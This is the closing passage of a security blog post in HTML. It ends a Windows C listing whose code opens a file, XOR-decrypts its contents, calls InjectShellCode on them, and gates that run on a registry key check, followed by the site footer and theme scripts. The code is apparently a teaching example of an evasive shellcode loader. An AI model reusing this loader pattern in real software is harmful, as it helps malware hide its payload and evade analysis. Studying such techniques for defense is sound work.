	<span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">CONFIG_FILE_PATH</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Got HANDLE on encrypted config file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bData</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
			
			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] %d bytes reads from file.</span><span class="se">\n</span><span class="s">--------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dwRead</span><span class="p">);</span>
			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwRead</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%02X &#34;</span><span class="p">,</span> <span class="n">bData</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
			<span class="p">}</span>
			
			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">[+] Decrypting ...</span><span class="se">\n</span><span class="s">--------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
			<span class="n">XorOneByteKey</span><span class="p">(</span><span class="n">bData</span><span class="p">,</span> <span class="n">dwRead</span><span class="p">,</span> <span class="n">XOR_KEY</span><span class="p">);</span>
			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwRead</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%02X &#34;</span><span class="p">,</span> <span class="n">bData</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
			<span class="p">}</span>
			
			<span class="n">InjectShellCode</span><span class="p">(</span><span class="n">bData</span><span class="p">,</span> <span class="n">dwRead</span><span class="p">);</span>
			<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">HKEY</span> <span class="n">hKey</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">LONG</span> <span class="n">lReturn</span><span class="p">;</span>
	<span class="n">lReturn</span> <span class="o">=</span> <span class="n">RegOpenKeyExA</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="s">&#34;SOFTWARE</span><span class="se">\\</span><span class="s">super_secret_unguessable_value&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">KEY_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">lReturn</span> <span class="o">==</span> <span class="n">ERROR_SUCCESS</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Key exists! Proceeding execution...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="n">ReadAndDecryptConfig</span><span class="p">();</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Key does not exists, aborting.&#34;</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://luhko.github.io/">Luhko</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
